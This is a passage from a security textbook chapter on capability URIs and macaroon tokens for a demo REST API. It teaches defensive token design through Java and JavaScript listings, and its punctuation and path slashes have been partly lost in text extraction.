.map path ->              capabilityController.createUri request, path, perms               .collect Collectors.toList    ;  Remove any permissions  that are not applicable.  Create new capabilities using the revised permissions.   Capabilities and REST  311  Update the remaining methods in the SpaceController.java file to return appropriate capability URIs, remembering to follow POLA. The GitHub repository accompanying the book  https:  github.com NeilMadden apisecurityinaction  has completed source code if you get stuck, but I’d recommend trying this yourself first.  TIP You can use the ability to specify different expiry times for links to imple- ment useful functionality. For example, when a user posts a new message, you can return a link that lets them edit it for a few minutes only. A separate link can provide permanent read-only access. This allows users to correct mistakes but not change historical messages.  Pop quiz 3  The  capability  URIs  for  each  space  use  never-expiring  database  tokens.  Over time, this will fill the database with tokens. Which of the following are ways you could prevent this? a Hashing tokens in the database b Using a self-contained token format such as JWTs c Using a cloud-native database that can scale up to hold all the tokens d Using the HmacTokenStore in addition to the DatabaseTokenStore e Reusing an existing token when the same capability has already been issued  4 Which is the main reason why HATEOAS is an important design principle when  using capability URIs? Pick one answer. a HATEOAS is a core part of REST. b Capability URIs are hard to remember. c Clients can’t be trusted to make their own URIs. d Roy Fielding, the inventor of REST, says that it’s important. e A client can’t make their own capability URIs and so can only access other  resources through links.  The answers are at the end of the chapter.  9.2.4  Capability URIs for browser-based clients In section 9.2.1, I mentioned that putting the token in the URI path or query parame- ters  is  less  than  ideal  because  these  can  leak  in  audit  logs,  Referer  headers,  and through your browser history. These risks are limited when capability URIs are used in an API but can be a real problem when these URIs are directly exposed to users in a web browser client. If you use capability URIs in your API, browser-based clients will need to somehow translate the URIs used in the API into URIs used for navigating the UI.  A  natural  approach  would  be  to  use  capability  URIs  for  this  too,  reusing  the tokens from the API URIs. In this section, you’ll see how to do this securely.   One approach to this problem is to put the token in a part of the URI that is not usually sent to the server or included in Referer headers. The original solution was   312  CHAPTER 9 Capability-based security and macaroons  developed  for  the Waterken  server that  used  capability URIs  extensively,  under  the name web-keys  http:  waterken.sourceforge.net web-key  . In a web-key, the unguess- able token is stored in the fragment component of the URI; that is, the bit after a  character at the end of the URI. The fragment is normally used to jump to a particular location within a larger document, and has the advantage that it is never sent to the server by clients and never included in a Referer header or window.referrer field in JavaScript,  and  so  is  less  susceptible  to  leaking.  The  downside  is  that  because  the server doesn’t see the token, the client must extract it from the URI and send it to the server by other means.   In Waterken, which was designed for web applications, when a user clicked a web- key link in the browser, it loaded a simple template JavaScript page. The JavaScript then extracted the token from the query fragment  using the window.location.hash variable   and  made  a  second  call  to  the  web  server,  passing  the  token  in  a  query parameter. The flow is shown in figure 9.3.    Because the JavaScript template itself contains no sensitive data and is the same for all  URIs,  it  can  be  served  with  long-lived  cache-control  headers  and  so  after  the browser has loaded it once, it can be reused for all subsequent capability URIs without an  extra  call  to  the  server,  as  shown  in  the  lower  half  of  figure  9.3.  This  approach works well with single-page apps  SPAs  because they often already use the fragment in this way to permit navigation in the app without causing the page to reload while still populating the browser history.  WARNING Although the fragment component is not sent to the server, it will be included if a redirect occurs. If your app needs to redirect to another site, you  should  always  explicitly  include  a  fragment  component  in  the  redirect URI to avoid accidentally leaking tokens in this way.  Listing 9.8 shows how to parse and load a capability URI in this format from a Java- Script API client. It first parses the URI using the URL class and extracts the token from the hash field, which contains the fragment component. This field include the literal “” character at the start, so use hash.substring 1  to remove this. You should then remove this component from the URI to send to the API and instead add the token back as a query parameter. This ensures that the CapabilityController will see the token in the expected place. Navigate to src main resources public and create a new file named capability.js with the contents of the listing.  NOTE This code assumes that UI pages correspond directly to URIs in your API. For an SPA this won’t be true, and there is  by definition  a single UI page that handles all requests. In this case, you’ll need to encode the API path and  the  token  into  the  fragment  together  in  a  form  such  as   spaces 1  messages&tok=abc123. Modern frameworks such as Vue or React can use the HTML 5 history API to make SPA URIs look like normal URIs  without the fragment . When using these frameworks, you should ensure the token is in the real fragment component; otherwise, the security benefits are lost.   Capabilities and REST  313  The browser loads a capability URI.  The initial request to the server loads a static JavaScript template, ignoring the fragment.  https:  example.com fooabc123...  GET  foo  Web server  Browser  JavaScript template  GET  foo?s=abc123..  API  The JavaScript extracts the token from the fragment and makes an Ajax request to the server with the token this time.  https:  example.com fooabc123...  On subsequent requests, the JavaScript template will already be in the browser’s cache.  Browser  GET  foo?s=abc123..  API  Figure 9.3 In the Waterken web-key design for capability URIs, the token is  stored in the fragment of the URI, which is never sent to the server. When a  browser loads such a URI, it will initially load a static JavaScript page that then  extracts the token from the fragment and uses it to make Ajax requests to the  API. The JavaScript template can be cached by the browser, avoiding the extra  roundtrip for subsequent requests.  Blank out the fragment.  Listing 9.8 Loading a capability URI from JavaScript  function getCap url, callback  {     let capUrl = new URL url ;                  let token = capUrl.hash.substring 1 ;       capUrl.hash = '';         capUrl.search = '?access_token=' + token;      Parse the URL and extract  the token from the fragment   hash  component.      return fetch capUrl.href                 .then response => response.json        .then callback      .catch err => console.error 'Error: ', err  ; }  Add the token to  the URI query  parameters.  Now fetch the URI to call  the API with the token.   314  CHAPTER 9 Capability-based security and macaroons  9.2.5  Pop quiz 5 Which of the following is the main security risk when including a capability token  in the fragment component of a URI? a URI fragments aren’t RESTful. b The random token makes the URI look ugly. c The fragment may be leaked in server logs and the HTTP Referer header. If the server performs a redirect, the fragment will be copied to the new URI. d e The fragment may already be used for other data, causing it to be overwritten.  The answer is at the end of the chapter.  Combining capabilities with identity All calls to the Natter API are now authorized purely using capability tokens, which are scoped to an individual resource and not tied to any user. As you saw with the sim- ple  message browser example in  the last  section, you can even  hard-code read-only capability URIs into a web page to allow completely anonymous browsing of messages. Some API calls still require user authentication though, such as creating a new space or posting a message. The reason is that those API actions involve claims about who the user is, so you still need to authenticate those claims to ensure they are genuine, for  accountability  reasons  rather  than  for  authorization.  Otherwise,  anybody  with  a capability URI to post messages to a space could use it to impersonate any other user.  You may also want to positively identify users for other reasons, such as to ensure you  have  an  accurate  audit  log  of  who  did  what.  Because  a  capability  URI  may  be shared  by  lots  of  users,  it  is  useful  to  identify  those  users  independently  from  how their  requests  are  authorized.  Finally,  you  may  want  to  apply  some  identity-based access  controls  on  top  of  the  capability-based  access.  For  example,  in  Google  Docs  https:  docs.google.com   you  can  share  documents  using  capability  URIs,  but  you can  also  restrict  this  sharing  to  only  users  who  have  an  account  in  your  company’s domain. To access the document, a user needs to both have the link and be signed into a Google account linked to the same company.   There are a few ways to communicate identity in a capability-based system:  You  can  associate  a  username  and  other  identity  claims  with  each  capability token. The permissions in the token are still what grants access, but the token additionally authenticates identity claims  about the user that can be used  for audit logging or additional access checks. The major downside of this approach is  that  sharing  a  capability  URI  lets  the  recipient  impersonate  you  whenever they make calls to the API using that capability. Nevertheless, this approach can be useful when generating short-lived capabilities that are only intended for a single user. The link sent in a password reset email can be seen as this kind of capability  URI  because  it  provides  a  limited-time  capability  to  reset  the  pass- word tied to one user’s account.   Capabilities and REST  315   You could use a traditional authentication mechanism, such as a session cookie, to identify the user in addition to requiring a capability token, as shown in fig- ure 9.4. The cookie would no longer be used to authorize API calls but would instead be used to identify the user for audit logging or for additional checks. Because the cookie is no longer used for access control, it is less sensitive and so can  be  a  long-lived  persistent  cookie,  reducing  the  need  for  the  user  to  fre- quently log in.  The capability URI grants access.  Client  API  POST  abc?tok=sjkhfDF...  Cookie: user=alice  A cookie identiﬁes the user for audit logs.  Figure 9.4 By combining capability URIs with a traditional  authentication mechanism such as cookies, the API can enforce  access using capabilities while authenticating identity claims  using the cookie. The same capability URI can be shared between  users, but the API is still able to positively identify each of them.  When developing a REST API, the second option is often attractive because you can reuse  traditional  cookie-based  authentication  technologies  such  as  a  centralized OpenID Connect identity provider  chapter 7 . This is the approach taken in the Nat- ter API, where the permissions for an API call come from a capability URI, but some API calls need additional user authentication using a traditional mechanism such as HTTP Basic authentication or an authentication token or cookie.    To switch back to using cookies for authentication, open the Main.java file in your editor and find the lines that create the TokenController object. Change the token- Store variable to use the CookieTokenStore that you developed back in chapter 4:  SecureTokenStore tokenStore = new CookieTokenStore  ; var tokenController = new TokenController tokenStore ;  9.2.6 Hardening capability URIs  You may wonder if you can do away with the anti-CSRF token now that you’re using capabilities for access control, which are immune to CSRF. This would be a mistake, because an attacker that has a genuine capability to access the API can still use a CSRF attack to make their requests appear to come from a different user. The authority to   316  CHAPTER 9 Capability-based security and macaroons  access the API comes from the attacker’s capability URI, but the identity of the user comes from the cookie. If you keep the existing anti-CSRF token though, clients are required to send three credentials on every request:   The cookie identifying the user  The anti-CSRF token  The capability token authorizing the specific request  This is a bit excessive. At the same time, the capability tokens are vulnerable to being stolen. For example, if a capability URI meant for a moderator is stolen, then it can be used by anybody to delete messages. You can solve both problems by tying the capabil- ity tokens to an authenticated user and preventing them being used by anybody else. This removes one of the benefits of capability URIs—that they are easy to share—but improves the overall security:   If a capability token is stolen, it can’t be used without a valid login cookie for the user. If the cookie is set with the HttpOnly and Secure flags, then it becomes much harder to steal.   You can now remove the separate anti-CSRF token because each capability URI effectively  acts  as  an  anti-CSRF  token.  The  cookie  can’t  be  used  without  the capability and the capability can’t be used without the cookie.  Listing  9.9  shows  how  to  associate  a  capability  token  with  an  authenticated  user  by populating the username attribute of the token that you previously left blank. Open the CapabilityController.java file in your editor and add the highlighted lines of code.  Listing 9.9 Linking a capability with a user  public URI createUri Request request, String path, String perms,                      Duration expiryDuration  {     var subject =  String  request.attribute "subject" ;               var token = new Token now  .plus expiryDuration , subject ;          token.attributes.put "path", path ;     token.attributes.put "perms", perms ;  Look up the  authenticated  user.  Associate  the capability  with the user.      var tokenId = tokenStore.create request, token ;      var uri = URI.create request.uri   ;     return uri.resolve path + "?access_token=" + tokenId ; }  You can then adjust the lookupPermissions method in the same file to return no per- missions  if  the  username  associated  with  the  capability  token  doesn’t  match  the authenticated user, as shown in listing 9.10. This ensures that the capability can’t be used without an associated session for the user and that the session cookie can only be used when it matches the capability token, effectively preventing CSRF attacks too.      Capabilities and REST  317  Listing 9.10 Verifying the user  public void lookupPermissions Request request, Response response  {     var tokenId = request.queryParams "access_token" ;     if  tokenId == null  { return; }      tokenStore.read request, tokenId .ifPresent token -> {         if  !Objects.equals token.username,                            request.attribute "subject"    {                   return;                                            }                                               If the authenticated  user doesn’t match the  capability, it returns no  permissions.          var tokenPath = token.attributes.get "path" ;         if  Objects.equals tokenPath, request.pathInfo     {             request.attribute "perms",                     token.attributes.get "perms"  ;         }     } ; }  You can now delete the code that checks the anti-CSRF token in the CookieToken- Store if you wish and rely on the capability code to protect against CSRF. Refer to chapter 4 to see how the original version looked before CSRF protection was added. You’ll  also  need  to  adjust  the  TokenController.validateToken  method  to  not reject a request that  doesn’t have an anti-CSRF token. If you get stuck, check out chapter09-end  of  the  GitHub  repository  accompanying  the  book,  which  has  all  the required changes. SHARING ACCESS Because capability URIs are now tied to individual users, you need a new mechanism to share access to social spaces and individual messages. Listing 9.11 shows a new oper- ation to allow a user to exchange one of their own capability URIs for one for a differ- ent user, with an option to specify a reduced set of permissions. The method reads a capability URI from the input and looks up the associated token. If the URI matches the token and the requested permissions are a subset of the permissions granted by the original capability URI, then the method creates a new capability token with the new permissions and user and returns the requested URI. This new URI can then be safely shared with the intended user. Open the CapabilityController.java file and add the new method.  Listing 9.11 Sharing capability URIs  public JSONObject share Request request, Response response  {     var json = new JSONObject request.body   ;      var capUri = URI.create json.getString "uri"  ;              var path = capUri.getPath  ;                                 var query = capUri.getQuery  ;                               var tokenId = query.substring query.indexOf '='  + 1 ;    Parse the original  capability URI and  extract the token.   318  CHAPTER 9 Capability-based security and macaroons  Look up the token and check that it matches the URI.      var token = tokenStore.read request, tokenId .orElseThrow  ;       if  !Objects.equals token.attributes.get "path" , path   {             throw new IllegalArgumentException "incorrect path" ;          }                                                                   var tokenPerms = token.attributes.get "perms" ;         var perms = json.optString "perms", tokenPerms ;        if  !tokenPerms.contains perms   {                          Spark.halt 403 ;                                    }                                                       var user = json.getString "user" ;     var newToken = new Token token.expiry, user ;                newToken.attributes.put "path", path ;                       newToken.attributes.put "perms", perms ;                     var newTokenId = tokenStore.create request, newToken ;    Check that the  requested permissions  are a subset of the  token permissions.  Create and  store the new  capability token.      var uri = URI.create request.uri   ;                       var newCapUri = uri.resolve path + "?access_token="                + newTokenId ;                                     return new JSONObject                                              .put "uri", newCapUri ;                        }  Return the  requested  capability URI.  You can now add a new route to the Main class to expose this new operation. Open the Main.java file and add the following line to the main method:  post " capabilities", capController::share ;  You can now call this endpoint to exchange a privileged capability URI, such as the messages-rwd URI returned from creating a space, as in the following example:  curl -H 'Content-Type: application json' \   -d '{"uri":" spaces 1 messages?access_token= ➥ 0ed8-IohfPQUX486d0kr03W8Ec8", "user":"demo2", "perms":"r"}' \   https:  localhost:4567 share {"uri":" spaces 1 messages?access_token= ➥ 1YQqZdNAIce5AB_Z8J7ClMrnx68"}  The new capability URI in the response can only be used by the demo2 user and pro- vides  only  read  permission  on  the  space.  You  can  use  this  facility  to  build  resource sharing for your APIs. For example, if a user directly shares a capability URI of their own with another user, rather than denying access completely you could allow them to request access. This is what happens in Google Docs if you follow a link to a document that you don’t have access to. The owner of the document can then approve access. In Google Docs this is done by adding an entry to an access control list  chapter 3  asso- ciated with each document, but with capabilities, the owner could generate a capabil- ity URI instead that is then emailed to the recipient.   Macaroons: Tokens with caveats  319  9.3 Macaroons: Tokens with caveats  Capabilities allow users to easily share fine-grained access to their resources with other users. If a Natter user wants to share one of their messages with somebody who doesn’t have a Natter account, they can easily do this by creating a read-only capability URI for that specific message. The other user will be able to read only that one message and won’t get access to any other messages or the ability to post messages themselves.    Sometimes the granularity of capability URIs doesn’t match up with how users want to share resources. For example, suppose that you want to share read-only access to a snapshot of the conversations since yesterday in a social space. It’s unlikely that the API will always supply a capability URI that exactly matches the user’s wishes; the createSpace action already returns four URIs, and none of them quite fit the bill.   Macaroons provide a solution to this problem by allowing anybody to append caveats to a capability that restrict how it can be used. Macaroons were invented by a team of academic  and  Google  researchers  in  a  paper published  in  2014   https:  ai.google  research pubs pub41892 .  DEFINITION A macaroon is a type of cryptographic token that can be used to represent  capabilities  and  other  authorization  grants.  Anybody  can  append new caveats to a macaroon that restrict how it can be used.   To address our example, the user could append the following caveats to their capa- bility to create a new capability that allows only read access to messages since lunch- time yesterday:  method = GET since >= 2019-10-12T12:00:00Z  Unlike  the  share  method  that  you  added  in  section  9.2.6,  macaroon  caveats  can express general conditions like these. The other benefit of macaroons is that anyone can append a caveat to a macaroon using a macaroon library, without needing to call an API endpoint or have access to any secret keys. Once the caveat has been added it can’t be removed.    Macaroons use HMAC-SHA256 tags to protect the integrity of the token and any caveats just like the HmacTokenStore you developed in chapter 5. To allow anybody to append  caveats  to  a  macaroon,  even  if  they  don’t  have  the  key,  macaroons  use  an interesting property of HMAC: the authentication tag output from HMAC can itself be used as a key to sign a new message with HMAC. To append a caveat to a maca- roon, you use the old authentication tag as the key to compute a new HMAC-SHA256 tag over the caveat, as shown in figure 9.5. You then throw away the old authentication tag and append the caveat and the new tag to the macaroon. Because it’s infeasible to reverse  HMAC  to  recover  the  old  tag,  nobody  can  remove  caveats  that  have  been added unless they have the original key.   320  CHAPTER 9 Capability-based security and macaroons  The new caveat is fed into HMAC-SHA256 using the old HMAC tag as the key.  Identiﬁer  Caveat 1  Caveat 2  New caveat  New tag  Identiﬁer  Caveat 1  Caveat 2  New tag  Tag  HMAC-SHA256  New caveat  The old tag is discarded.  The new caveat and tag are appended to the macaroon.  Figure 9.5 To append a new caveat to a macaroon, you use the old HMAC  tag as the key to authenticate the new caveat. You then throw away the  old tag and append the new caveat and tag. Because nobody can reverse  HMAC to calculate the old tag, they cannot remove the caveat.  WARNING Because anybody can add a caveat to a macaroon, it is important that they are used only to restrict how a token is used. You should never trust any claims in a caveat or grant additional access based on their contents.  When the macaroon is presented back to the API, it can use the original HMAC key to reconstruct the original tag and all the caveat tags and check if it comes up with the same signature value at the end of the chain of caveats. Listing 9.12 shows an example of how to verify an HMAC chain just like that used by macaroons.    First initialize a javax.crypto.Mac object with the API’s authentication key  see chapter 5 for how to generate this  and then compute an initial tag over the maca- roon unique identifier. You then loop through each caveat in the chain and compute a new HMAC tag over the caveat, using the old tag as the key.5 Finally, you compare the computed tag with the tag that was supplied with the macaroon using a constant- time equality function. Listing 9.14 is just to demonstrate how it works; you’ll use a real macaroon library in the Natter API so you don’t need to implement this method.  Listing 9.12 Verifying the HMAC chain  private boolean verify String id, List  caveats, byte[] tag          throws Exception {     var hmac = Mac.getInstance "HmacSHA256" ;         hmac.init macKey ;                             Initialize HMAC-SHA256 with  the authentication key.  5  If you are a functional programming enthusiast, then this can be elegantly written as a left-fold or reduce operation.   Macaroons: Tokens with caveats  321  Compute an initial tag over the macaroon identifier.      var computed = hmac.doFinal id.getBytes UTF_8  ;         for  var caveat : caveats  {                                        hmac.init new SecretKeySpec computed, "HmacSHA256"  ;           computed = hmac.doFinal caveat.getBytes UTF_8  ;            }     return MessageDigest.isEqual tag, computed ;     }  Compute a new tag for  each caveat using the  old tag as the key.  Compare the tags  with a constant-time  equality function.  9.3.1  After the HMAC tag has been verified, the API then needs to check that the caveats are  satisfied.  There’s  no  standard  set  of  caveats  that  APIs  support,  so  like  OAuth2 scopes it’s up to the API designer to decide what to support. There are two broad cat- egories of caveats supported by macaroon libraries:   First-party  caveats  are  restrictions  that  can  be  easily  verified  by  the  API  at  the point of use, such as restricting the times of day at which the token can be used. First-party caveats are discussed in more detail in section 9.3.3.   Third-party  caveats  are  restrictions  which  require  the  client  to  obtain  a  proof from a third-party service, such as proof that the user is an employee of a partic- ular company or that they are over 18. Third-party caveats are discussed in sec- tion 9.3.4.  Contextual caveats A significant advantage of macaroons over other token forms is that they allow the cli- ent to attach contextual caveats just before the macaroon is used. For example, a client that  is  about  to  send  a  macaroon  to  an  API  over  an  untrustworthy  communication channel  can  attach  a  first-party  caveat  limiting  it  to  only  be  valid  for  HTTP  PUT requests to that specific URI for the next 5 seconds. That way, if the macaroon is sto- len, then the damage is limited because the attacker can only use the token in very restricted  circumstances.  Because  the  client  can  keep  a  copy  of  the  original  unre- stricted macaroon, their own ability to use the token is not limited in the same way.  DEFINITION A contextual caveat is a caveat that is added by a client just before use. Contextual caveats allow the authority of a token to be restricted before sending it over an insecure channel or to an untrusted API, limiting the dam- age that might occur if the token is stolen.  The  ability  to  add  contextual  caveats  makes  macaroons  one  of  the  most  important recent  developments  in  API  security.  Macaroons  can  be  used  with  any  token-based authentication and even OAuth2 access tokens if your authorization server supports them.6 On the other hand, there is no formal specification of macaroons and aware- ness and adoption of the format is still quite limited, so they are not as widely sup- ported as JWTs  chapter 6 .  6 My employer, ForgeRock, has added experimental support for macaroons to their authorization server software.   322  9.3.2  CHAPTER 9 Capability-based security and macaroons  A macaroon token store To use macaroons in the Natter API, you can use the open source jmacaroons library  https:  github.com nitram509 jmacaroons . Open the pom.xml file in your editor and add the following lines to the dependencies section:               com.github.nitram509         jmacaroons         0.4.1         You can now build a new token store implementation using macaroons as shown in listing 9.13. To create a macaroon, you’ll first use another TokenStore implementa- tion to generate the macaroon identifier. You can use any of the existing stores, but to keep the tokens compact you’ll use the DatabaseTokenStore in these examples. You could also use the JsonTokenStore, in which case the macaroon HMAC tag also pro- tects it against tampering.    You  then  create  the  macaroon  using  the  MacaroonsBuilder.create    method, passing  in  the  identifier  and  the  HMAC  key.  An  odd  quirk  of  the  macaroon  API means you have to pass the raw bytes of the key using macKey.getEncoded  . You can also give an optional hint for where the macaroon is intended to be used. Because you’ll be using these with capability URIs that already include the full location, you can leave that field blank to save space. You can then use the macaroon.serialize   method to convert the macaroon into a URL-safe base64 string format. In the same Natter API project you’ve been using so far, navigate to src main java com manning  apisecurityinaction token  and  create  a  new  file  called  MacaroonTokenStore.java. Copy the contents of listing 9.13 into the file and save it.  WARNING The location hint is not included in the authentication tag and is intended only as a hint to the client. Its value shouldn’t be trusted because it can be tampered with.  Listing 9.13 The MacaroonTokenStore  package com.manning.apisecurityinaction.token;  import java.security.Key; import java.time.Instant; import java.time.temporal.ChronoUnit; import java.util.Optional;  import com.github.nitram509.jmacaroons.*; import com.github.nitram509.jmacaroons.verifier.*; import spark.Request;  public class MacaroonTokenStore implements SecureTokenStore {     private final TokenStore delegate;     private final Key macKey;   Macaroons: Tokens with caveats  323      private MacaroonTokenStore TokenStore delegate, Key macKey  {         this.delegate = delegate;         this.macKey = macKey;     }  Use another token store to create a unique identifier for this macaroon.      @Override     public String create Request request, Token token  {         var identifier = delegate.create request, token ;             var macaroon = MacaroonsBuilder.create "",                         macKey.getEncoded  , identifier ;                  return macaroon.serialize  ;         } }  Return the serialized  URL-safe string form  of the macaroon.  Create the  macaroon with a  location hint, the  identifier, and the  authentication key.  Like  the  HmacTokenStore  from  chapter  4,  the  macaroon  token  store  only  provides authentication of tokens and not confidentiality unless the underlying store already provides that. Just as you did in chapter 5, you can create two static factory methods that return a correctly typed store depending on the underlying token store:   If the underlying token store is a  ConfidentialTokenStore, then it returns a SecureTokenStore  because  the  resulting  store  provides  both  confidentiality and authenticity of tokens.   Otherwise,  it  returns  an  AuthenticatedTokenStore  to  make  clear  that  confi-  dentiality is not guaranteed.  These factory methods are shown in listing 9.14 and are very similar to the ones you created in chapter 5, so open the MacaroonTokenStore.java file again and add these new methods.  Listing 9.14 Factory methods  public static SecureTokenStore wrap                                 ConfidentialTokenStore tokenStore, Key macKey  {        return new MacaroonTokenStore tokenStore, macKey ;      }                                                            If the underlying store  provides confidentiality of  token data, then return a  SecureTokenStore.  public static AuthenticatedTokenStore wrap                       TokenStore tokenStore, Key macKey  {                 return new MacaroonTokenStore tokenStore, macKey ;   }                                                         Otherwise, return an  AuthenticatedTokenStore.  To verify a macaroon, you deserialize and validate the macaroon using a Macaroons- Verifier, which will verify the HMAC tag and check any caveats. If the macaroon is valid, then you can look up the identifier in the delegate token store. To revoke a mac- aroon, you simply deserialize and revoke the identifier. In most cases, you shouldn’t check  the  caveats  on  the  token  when  it  is  being  revoked,  because  if  somebody  has gained access to your token, the least malicious thing they can do with it is revoke it! However, in some cases, malicious revocation might be a real threat, in which case you could  verify  the  caveats  to  reduce  the  risk  of  this  occurring.  Listing  9.15  shows  the   324  CHAPTER 9 Capability-based security and macaroons  operations  to  read  and  revoke  a  macaroon  token.  Open  the  MacaroonTokenStore .java file again and add the new methods.  Listing 9.15 Reading a macaroon token  @Override public Optional  read Request request, String tokenId  {     var macaroon = MacaroonsBuilder.deserialize tokenId ;         var verifier = new MacaroonsVerifier macaroon ;               if  verifier.isValid macKey.getEncoded     {                      return delegate.read request, macaroon.identifier ;        }     return Optional.empty  ; }  @Override public void revoke Request request, String tokenId  {     var macaroon = MacaroonsBuilder.deserialize tokenId ;     delegate.revoke request, macaroon.identifier ;     }  To revoke a macaroon, revoke the identifier in the delegate store.  Deserialize  and validate  the macaroon  signature and  caveats.  If the macaroon  is valid, then  look up the  identifier in the  delegate token  store.  WIRING IT UP You can now wire up the CapabilityController to use the new token store for capa- bility tokens. Open the Main.java file in your editor and find the lines that construct the CapabilityController. Update the file to use the MacaroonTokenStore instead. You  may  need  to  first  move  the  code  that  reads  the  macKey  from  the  keystore   see chapter 6  from later in the file. The code should look as follows, with the new part highlighted in bold:  var keyPassword = System.getProperty "keystore.password",         "changeit" .toCharArray  ; var keyStore = KeyStore.getInstance "PKCS12" ; keyStore.load new FileInputStream "keystore.p12" ,         keyPassword ; var macKey = keyStore.getKey "hmac-key", keyPassword ; var encKey = keyStore.getKey "aes-key", keyPassword ;  var capController = new CapabilityController          MacaroonTokenStore.wrap               new DatabaseTokenStore database , macKey  ;  If you now use the API to create a new space, you’ll see the macaroon tokens being used in the capability URIs returned from the API call. You can copy and paste those tokens into the debugger at http:  macaroons.io to see the component parts.  CAUTION You  should  not  paste  tokens  from  a  production  system  into  any website. At the time of writing, macaroons.io doesn’t even support SSL.  As  currently  written,  the  macaroon  token  store  works  very  much  like  the  existing HMAC token store. In the next sections, you’ll implement support for caveats to take full advantage of the new token format.   Macaroons: Tokens with caveats  325  9.3.3  First-party caveats The  simplest  caveats  are  first-party  caveats,  which  can  be verified  by  the  API purely based on the API request and the current environment. These caveats are represented as  strings  and  there  is  no  standard  format.  The  only  commonly  implemented  first- party caveat is to set an expiry time for the macaroon using the syntax:  time < 2019-10-12T12:00:00Z  You can think of this caveat as being like the expiry  exp  claim in a JWT  chapter 6 . The tokens issued by the Natter API already have an expiry time, but a client might want to create a copy of their token with a more restricted expiry time as discussed in section 9.3.1 on contextual caveats.   To verify any  expiry time caveats,  you can use  a  TimestampCaveatVerifier  that comes with the jmacaroons library as shown in listing 9.16. The macaroons library will try to match each caveat to a verifier that is able to satisfy it. In this case, the verifier checks that the current time is before the expiry time specified in the caveat. If the verification fails, or if the library is not able to find a verifier that matches a caveat, then the macaroon is rejected. This means that the API must explicitly register verifi- ers for all types of caveats that it supports. Trying to add a caveat that the API doesn’t support  will  prevent  the  macaroon  from  being  used.  Open  the  MacaroonToken- Store.java file in your editor again and update the read method to verify expiry caveats as shown in the listing.  Listing 9.16 Verifying the expiry timestamp  @Override public Optional  read Request request, String tokenId  {     var macaroon = MacaroonsBuilder.deserialize tokenId ;      var verifier = new MacaroonsVerifier macaroon ;     verifier.satisfyGeneral new TimestampCaveatVerifier   ;          if  verifier.isValid macKey.getEncoded     {         return delegate.read request, macaroon.identifier ;     }     return Optional.empty  ; }  Add a Timestamp- CaveatVerifier to  satisfy the expiry  caveat.  You can also add your own caveat verifiers using two methods. The simplest is the satisfyExact method, which will satisfy caveats that exactly match the given string. For example, you can allow a client to restrict a macaroon to a single type of HTTP method by adding the line:  verifier.satisfyExact "method = " + request.requestMethod   ;  to the read method. This ensures that a macaroon with the caveat method = GET can only be used on HTTP GET requests, effectively making it read-only. Add that line to the read method now.   326  CHAPTER 9 Capability-based security and macaroons   A more general approach is to implement the GeneralCaveatVerifier interface, which  allows  you  to  implement  arbitrary  conditions  to  satisfy  a  caveat.  Listing  9.17 shows  an  example  verifier  to  check  that  the  since  query  parameter  to  the  find- Messages method is after a certain time, allowing you to restrict a client to only view messages since yesterday. The class parses the caveat and the parameter as Instant objects and then checks that the request is not trying to read messages older than the caveat using the isAfter method. Open the MacaroonTokenStore.java file again and add the contents of listing 9.17 as an inner class.  Listing 9.17 A custom caveat verifier  private static class SinceVerifier implements GeneralCaveatVerifier {     private final Request request;      private SinceVerifier Request request  {         this.request = request;     }      @Override     public boolean verifyCaveat String caveat  {         if  caveat.startsWith "since > "   {                                 var minSince = Instant.parse caveat.substring 8  ;    Check the  caveat matches  and parse the  restriction.  Determine the “since” parameter value on the request.              var reqSince = Instant.now  .minus 1, ChronoUnit.DAYS ;                   if  request.queryParams "since"  != null  {                                   reqSince = Instant.parse request.queryParams "since"  ;               }             return reqSince.isAfter minSince ;              }  Satisfy the caveat if the  request is after the earliest  message restriction.          return false;        } }  Reject all  other caveats.  You can then add the new verifier to the read method by adding the following line      verifier.satisfyGeneral new SinceVerifier request  ;  next to the lines adding the other caveat verifiers. The finished code to construct the verifier should look as follows:  var verifier = new MacaroonsVerifier macaroon ; verifier.satisfyGeneral new TimestampCaveatVerifier   ; verifier.satisfyExact "method = " + request.requestMethod   ; verifier.satisfyGeneral new SinceVerifier request  ;  ADDING CAVEATS To add a caveat to a macaroon, you can parse it using the MacaroonsBuilder class and then use the add_first_party_caveat method to append caveats, as shown in list- ing 9.18. The listing is a standalone command-line program for adding caveats to a   Macaroons: Tokens with caveats  327  macaroon. It first parses the macaroon, which is passed as the first argument to the program, and then loops through any remaining arguments treating them as caveats. Finally, it prints out the resulting macaroon as a string again. Navigate to the src main  java com manning apisecurityinaction  folder  and  create  a  new  file  named  Caveat- Appender.java and type in the contents of the listing.  Listing 9.18 Appending caveats  package com.manning.apisecurityinaction;  import com.github.nitram509.jmacaroons.MacaroonsBuilder; import static com.github.nitram509.jmacaroons.MacaroonsBuilder.deserialize;  Parse the macaroon and create a MacaroonsBuilder.  public class CaveatAppender {     public static void main String... args  {         var builder = new MacaroonsBuilder deserialize args[0]  ;             for  int i = 1; i < args.length; ++i  {                    var caveat = args[i];                                  builder.add_first_party_caveat caveat ;            }                                                      System.out.println builder.getMacaroon  .serialize   ;          } }  Serialize the macaroon back into a string.  Add each caveat to  the macaroon.  IMPORTANT Compared to the server, the client needs only a few lines of code to append caveats and doesn’t need to store any secret keys.   To test out the program, use the Natter API to create a new social space and receive a capability URI with a macaroon token. In this example, I’ve used the jq and cut utili- ties to extract the macaroon token, but you can manually copy and paste if you prefer:  MAC=$ curl -u demo:changeit -H 'Content-Type: application json' \   -d '{"owner":"demo","name":"test"}' \   https:  localhost:4567 spaces  jq -r '.["messages-rw"]' \    cut -d= -f2   You can then append a caveat, for example setting the expiry time a minute or so into the future:  NEWMAC=$ mvn -q exec:java \   -Dexec.mainClass= com.manning.apisecurityinaction.CaveatAppender \   -Dexec.args="$MAC 'time < 2020-08-03T12:05:00Z'"   You can then use this new macaroon to read any messages in the space until it expires:  curl -u demo:changeit -i \   "https:  localhost:4567 spaces 1 messages?access_token=$NEWMAC"  After the new time limit expires, the request will return a 403 Forbidden error, but the original token will still work  just change $NEWMAC to $MAC in the query to test this .   328  CHAPTER 9 Capability-based security and macaroons  9.3.4  This  demonstrates  the  core  advantage  of  macaroons:  once  you’ve  configured  the server it’s very easy  and fast  for a client to append contextual caveats that restrict the use of a token, protecting those tokens in case of compromise. A JavaScript client run- ning in a web browser can use a JavaScript macaroon library to easily append caveats every time it uses a token with just a few lines of code.  Third-party caveats First-party caveats provide considerable flexibility and security improvements over tra- ditional tokens on their own, but macaroons also allow third-party caveats that are ver- ified by an external service. Rather than the API verifying a third-party caveat directly, the client instead must contact the third-party service itself and obtain a discharge mac- aroon that proves that the condition is satisfied. The two macaroons are cryptographi- cally  tied  together  so  that  the  API  can  verify  that  the  condition  is  satisfied  without talking directly 